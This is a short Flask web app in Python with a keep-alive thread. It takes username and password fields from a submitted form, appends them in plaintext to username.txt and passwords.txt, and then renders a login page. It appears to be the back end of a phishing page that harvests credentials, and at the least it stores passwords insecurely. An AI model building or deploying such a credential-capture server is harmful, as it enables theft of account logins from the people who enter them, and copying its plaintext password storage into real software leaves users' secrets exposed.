from flask import Flask
from threading import Thread
from flask import Flask, render_template, request # Import Flask Class


app = Flask('')

@app.route('/', methods=["GET", "POST"])
def main():



  username = request.form.get("username")

  password = request.form.get("password")

      
  if "submit" in request.form.keys():
    
    f = open("username.txt", "a")
    username2 = str(username)
    username3 = username2 + "\n"
    f.write(username3)
    f.close()

    f = open("passwords.txt", "a")
    password2 = str(password)
    password3 = password2 + "\n"
    f.write(password3)
    f.close()
    return render_template("login.html")


  return render_template("index.html")

def run():
    app.run(host="0.0.0.0", port=8080)

def keep_alive():
    server = Thread(target=run)
    server.start()